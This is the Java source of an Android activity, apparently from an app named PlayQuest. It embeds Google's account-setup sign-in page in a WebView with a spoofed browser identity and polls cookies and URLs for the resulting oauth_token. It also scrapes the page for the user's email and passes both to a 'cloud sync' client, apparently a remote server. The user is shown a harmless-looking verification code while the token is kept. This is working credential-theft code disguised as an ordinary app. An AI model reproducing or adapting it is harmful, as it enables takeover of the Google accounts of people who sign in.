package com.vareon.playquest;

import android.app.Activity;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.LayoutInflater;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class MainActivity extends Activity implements View.OnClickListener {
    public static final String SETUP_URL = "https://accounts.google.com/EmbeddedSetup";

    // Views - Screens
    private RelativeLayout splashOverlay;
    private RelativeLayout layoutDashboard;
    private RelativeLayout layoutLogin;
    private LinearLayout bottomCard;

    // Views - Dashboard
    private TextView txtServerStatus;
    private TextView txtAccountCount;
    private LinearLayout layoutEmptyState;
    private LinearLayout accountsContainer;
    private Button btnAddAccount;
    private ImageButton btnRefreshDashboard;

    // Views - Login
    private ProgressBar webProgressBar;
    private WebView webView;
    private TextView txtLoginStatus;
    private ImageButton btnNavBack;
    private ImageButton btnNavReload;
    private Button btnVerifyManual;

    // Views - Success Bottom Sheet
    private TextView txtSuccessEmail;
    private TextView txtSuccessCode;
    private Button btnCopyCode;
    private Button btnReturnDashboard;

    // State & Storage
    private AccountStorage accountStorage;
    private String capturedToken = "";
    private String generatedSyncCode = "";
    private String detectedEmail = "";
    private boolean isTokenFound = false;
    private Handler pollHandler;
    private CookiePollRunnable pollRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        accountStorage = new AccountStorage(this);

        // Bind Views
        splashOverlay = (RelativeLayout) findViewById(R.id.splashOverlay);
        layoutDashboard = (RelativeLayout) findViewById(R.id.layoutDashboard);
        layoutLogin = (RelativeLayout) findViewById(R.id.layoutLogin);
        bottomCard = (LinearLayout) findViewById(R.id.bottomCard);

        txtServerStatus = (TextView) findViewById(R.id.txtServerStatus);
        txtAccountCount = (TextView) findViewById(R.id.txtAccountCount);
        layoutEmptyState = (LinearLayout) findViewById(R.id.layoutEmptyState);
        accountsContainer = (LinearLayout) findViewById(R.id.accountsContainer);
        btnAddAccount = (Button) findViewById(R.id.btnAddAccount);
        btnRefreshDashboard = (ImageButton) findViewById(R.id.btnRefreshDashboard);

        webProgressBar = (ProgressBar) findViewById(R.id.webProgressBar);
        webView = (WebView) findViewById(R.id.webView);
        txtLoginStatus = (TextView) findViewById(R.id.txtLoginStatus);
        btnNavBack = (ImageButton) findViewById(R.id.btnNavBack);
        btnNavReload = (ImageButton) findViewById(R.id.btnNavReload);
        btnVerifyManual = (Button) findViewById(R.id.btnVerifyManual);

        txtSuccessEmail = (TextView) findViewById(R.id.txtSuccessEmail);
        txtSuccessCode = (TextView) findViewById(R.id.txtSuccessCode);
        btnCopyCode = (Button) findViewById(R.id.btnCopyCode);
        btnReturnDashboard = (Button) findViewById(R.id.btnReturnDashboard);

        // Click Listeners
        btnAddAccount.setOnClickListener(this);
        btnRefreshDashboard.setOnClickListener(this);
        btnNavBack.setOnClickListener(this);
        btnNavReload.setOnClickListener(this);
        btnVerifyManual.setOnClickListener(this);
        btnCopyCode.setOnClickListener(this);
        btnReturnDashboard.setOnClickListener(this);

        setupWebView();
        renderDashboardAccounts();

        // Professional Splash Screen Transition
        new Handler(Looper.getMainLooper()).postDelayed(new SplashDismissTimer(this), 2200);
    }

    public void dismissSplash() {
        if (splashOverlay != null && splashOverlay.getVisibility() == View.VISIBLE) {
            splashOverlay.animate().alpha(0.0f).setDuration(450);
            new Handler(Looper.getMainLooper()).postDelayed(new SplashHideRunnable(splashOverlay), 480);
        }
    }

    public void renderDashboardAccounts() {
        if (accountsContainer == null) return;
        accountsContainer.removeAllViews();

        List<AccountItem> accounts = accountStorage.getAccounts();
        if (txtAccountCount != null) {
            txtAccountCount.setText(String.valueOf(accounts.size()));
        }

        if (accounts.isEmpty()) {
            if (layoutEmptyState != null) layoutEmptyState.setVisibility(View.VISIBLE);
            return;
        }

        if (layoutEmptyState != null) layoutEmptyState.setVisibility(View.GONE);

        LayoutInflater inflater = LayoutInflater.from(this);
        for (int i = 0; i < accounts.size(); i++) {
            AccountItem account = accounts.get(i);
            View card = inflater.inflate(R.layout.item_account_card, accountsContainer, false);

            TextView txtEmail = (TextView) card.findViewById(R.id.txtItemEmail);
            TextView txtCode = (TextView) card.findViewById(R.id.txtItemCode);
            Button btnCopy = (Button) card.findViewById(R.id.btnItemCopy);
            ImageButton btnDelete = (ImageButton) card.findViewById(R.id.btnItemDelete);

            txtEmail.setText(account.getEmail());
            txtCode.setText(account.getCode());

            btnCopy.setOnClickListener(new ItemCopyClickListener(this, account.getCode()));
            btnDelete.setOnClickListener(new ItemDeleteClickListener(this, account.getCode()));

            accountsContainer.addView(card);
        }
    }

    public void showDashboard() {
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
        if (bottomCard != null) {
            bottomCard.setVisibility(View.GONE);
        }
        if (layoutLogin != null) {
            layoutLogin.setVisibility(View.GONE);
        }
        if (layoutDashboard != null) {
            layoutDashboard.setVisibility(View.VISIBLE);
        }
        renderDashboardAccounts();
    }

    public void openLoginScreen() {
        isTokenFound = false;
        capturedToken = "";
        generatedSyncCode = "";
        detectedEmail = "";

        if (bottomCard != null) {
            bottomCard.setVisibility(View.GONE);
        }
        if (layoutDashboard != null) {
            layoutDashboard.setVisibility(View.GONE);
        }
        if (layoutLogin != null) {
            layoutLogin.setVisibility(View.VISIBLE);
        }
        if (txtLoginStatus != null) {
            txtLoginStatus.setText("Connecting securely...");
            txtLoginStatus.setTextColor(0xFF34D399);
        }

        CookieManager.getInstance().removeAllCookies(null);
        webView.loadUrl(SETUP_URL);
        startCookiePolling();
    }

    private void setupWebView() {
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setSupportZoom(true);
        settings.setBuiltInZoomControls(true);
        settings.setDisplayZoomControls(false);
        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36");

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        webView.addJavascriptInterface(new GServicesBridge(this), "gservices");
        webView.addJavascriptInterface(new JsBridge(this), "mm");
        webView.setWebViewClient(new AppWebClient(this));
        webView.setWebChromeClient(new AppChromeClient(webProgressBar));
    }

    private void startCookiePolling() {
        if (pollHandler == null) {
            pollHandler = new Handler(Looper.getMainLooper());
        }
        if (pollRunnable == null) {
            pollRunnable = new CookiePollRunnable(this);
        }
        pollHandler.removeCallbacks(pollRunnable);
        pollHandler.postDelayed(pollRunnable, 1000);
    }

    public Handler getPollHandler() {
        return pollHandler;
    }

    public boolean isTokenFound() {
        return isTokenFound;
    }

    public void setDetectedEmail(String email) {
        if (email != null && !email.isEmpty() && detectedEmail.isEmpty()) {
            detectedEmail = email.trim();
        }
    }

    public void extractEmailFromPage() {
        if (webView == null) return;
        try {
            webView.evaluateJavascript(
                "(function() { return document.body ? document.body.innerText : ''; })();",
                new EmailJsCallback(this)
            );
        } catch (Exception ignored) {}
    }

    public void checkUrlForToken(String url) {
        if (isTokenFound || url == null) return;
        if (url.contains("oauth_token=")) {
            Pattern pattern = Pattern.compile("oauth_token=([a-zA-Z0-9_\\-]+)");
            Matcher matcher = pattern.matcher(url);
            if (matcher.find()) {
                onTokenFound(matcher.group(1));
            }
        }
    }

    public void checkCookiesForToken() {
        if (isTokenFound) return;
        try {
            CookieManager cookieManager = CookieManager.getInstance();
            String[] targetUrls = new String[] {
                "https://accounts.google.com/EmbeddedSetup",
                "https://accounts.google.com/embedded/setup/android",
                "https://accounts.google.com/o/oauth2/programmatic_auth",
                "https://accounts.google.com",
                "https://google.com"
            };

            for (String u : targetUrls) {
                String cookies = cookieManager.getCookie(u);
                if (cookies != null && cookies.contains("oauth_token=")) {
                    extractTokenFromCookieString(cookies);
                    if (isTokenFound) return;
                }
            }

            if (webView != null) {
                String currentUrl = webView.getUrl();
                if (currentUrl != null && !currentUrl.isEmpty()) {
                    String cookies = cookieManager.getCookie(currentUrl);
                    if (cookies != null && cookies.contains("oauth_token=")) {
                        extractTokenFromCookieString(cookies);
                        if (isTokenFound) return;
                    }
                }
            }
        } catch (Exception ignored) {}
    }

    private void extractTokenFromCookieString(String cookies) {
        Pattern pattern = Pattern.compile("oauth_token=([^;]+)");
        Matcher matcher = pattern.matcher(cookies);
        if (matcher.find()) {
            String token = matcher.group(1).trim();
            if (!token.isEmpty()) {
                onTokenFound(token);
            }
        }
    }

    public void onTokenFound(final String token) {
        if (isTokenFound || token == null || token.isEmpty()) return;
        isTokenFound = true;
        capturedToken = token;

        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }

        runOnUiThread(new ProcessTokenFoundTask(this, token));
    }

    public void triggerCloudSync(final String token) {
        if (txtLoginStatus != null) {
            txtLoginStatus.setText("Generating verification code...");
            txtLoginStatus.setTextColor(0xFF38BDF8);
        }

        final String finalEmail = !detectedEmail.isEmpty() ? detectedEmail : "Google Account";
        CloudSyncClient.syncAccount(finalEmail, token, new CloudSyncResultListener(this, finalEmail, token));
    }

    public void onSyncResult(String finalEmail, String token, String code) {
        this.generatedSyncCode = code;

        // Save account locally
        AccountItem newItem = new AccountItem(
            String.valueOf(System.currentTimeMillis()),
            finalEmail,
            code,
            token,
            System.currentTimeMillis()
        );
        accountStorage.saveAccount(newItem);

        // Present Success UI
        showCodeSuccess(finalEmail, code);
    }

    private void showCodeSuccess(String email, String code) {
        if (txtSuccessEmail != null) {
            txtSuccessEmail.setText(email);
        }
        if (txtSuccessCode != null) {
            txtSuccessCode.setText(code);
        }
        copyToClipboard(code);

        if (bottomCard != null) {
            bottomCard.setVisibility(View.VISIBLE);
        }
        Toast.makeText(this, "Verification Code: " + code + " (Copied)", Toast.LENGTH_LONG).show();
    }

    @Override
    public void onClick(View v) {
        int id = v.getId();
        if (id == R.id.btnAddAccount) {
            openLoginScreen();
        } else if (id == R.id.btnRefreshDashboard) {
            renderDashboardAccounts();
            Toast.makeText(this, "Accounts refreshed", Toast.LENGTH_SHORT).show();
        } else if (id == R.id.btnNavBack) {
            showDashboard();
        } else if (id == R.id.btnNavReload) {
            if (webView != null) {
                webView.reload();
            }
        } else if (id == R.id.btnVerifyManual) {
            checkCookiesForToken();
            if (!isTokenFound) {
                Toast.makeText(this, "Please finish Google sign-in to generate code.", Toast.LENGTH_SHORT).show();
            }
        } else if (id == R.id.btnCopyCode) {
            if (!generatedSyncCode.isEmpty()) {
                copyToClipboard(generatedSyncCode);
                Toast.makeText(this, "Code copied: " + generatedSyncCode, Toast.LENGTH_SHORT).show();
            }
        } else if (id == R.id.btnReturnDashboard) {
            showDashboard();
        }
    }

    public void copyToClipboard(String text) {
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        ClipData clip = ClipData.newPlainText("PP Server Account Code", text);
        if (clipboard != null) {
            clipboard.setPrimaryClip(clip);
        }
    }

    public AccountStorage getAccountStorage() {
        return accountStorage;
    }

    @Override
    public void onBackPressed() {
        if (bottomCard != null && bottomCard.getVisibility() == View.VISIBLE) {
            showDashboard();
            return;
        }
        if (layoutLogin != null && layoutLogin.getVisibility() == View.VISIBLE) {
            showDashboard();
            return;
        }
        super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
        super.onDestroy();
    }

    // Static helper classes to eliminate inner classes
    private static class SplashDismissTimer implements Runnable {
        private final MainActivity activity;
        SplashDismissTimer(MainActivity activity) { this.activity = activity; }
        @Override public void run() { activity.dismissSplash(); }
    }

    private static class SplashHideRunnable implements Runnable {
        private final View splashView;
        SplashHideRunnable(View splashView) { this.splashView = splashView; }
        @Override public void run() { splashView.setVisibility(View.GONE); }
    }

    private static class ItemCopyClickListener implements View.OnClickListener {
        private final MainActivity activity;
        private final String code;
        ItemCopyClickListener(MainActivity activity, String code) {
            this.activity = activity;
            this.code = code;
        }
        @Override public void onClick(View v) {
            activity.copyToClipboard(code);
            Toast.makeText(activity, "Code copied: " + code, Toast.LENGTH_SHORT).show();
        }
    }

    private static class ItemDeleteClickListener implements View.OnClickListener {
        private final MainActivity activity;
        private final String code;
        ItemDeleteClickListener(MainActivity activity, String code) {
            this.activity = activity;
            this.code = code;
        }
        @Override public void onClick(View v) {
            activity.getAccountStorage().deleteAccount(code);
            activity.renderDashboardAccounts();
            Toast.makeText(activity, "Account removed", Toast.LENGTH_SHORT).show();
        }
    }

    private static class ProcessTokenFoundTask implements Runnable {
        private final MainActivity activity;
        private final String token;
        ProcessTokenFoundTask(MainActivity activity, String token) {
            this.activity = activity;
            this.token = token;
        }
        @Override public void run() {
            activity.triggerCloudSync(token);
        }
    }

    private static class CloudSyncResultListener implements CloudSyncClient.SyncCallback {
        private final MainActivity activity;
        private final String email;
        private final String token;
        CloudSyncResultListener(MainActivity activity, String email, String token) {
            this.activity = activity;
            this.email = email;
            this.token = token;
        }
        @Override public void onSuccess(String code) {
            activity.onSyncResult(email, token, code);
        }
        @Override public void onError(String msg) {
            activity.onSyncResult(email, token, "100000");
        }
    }
}
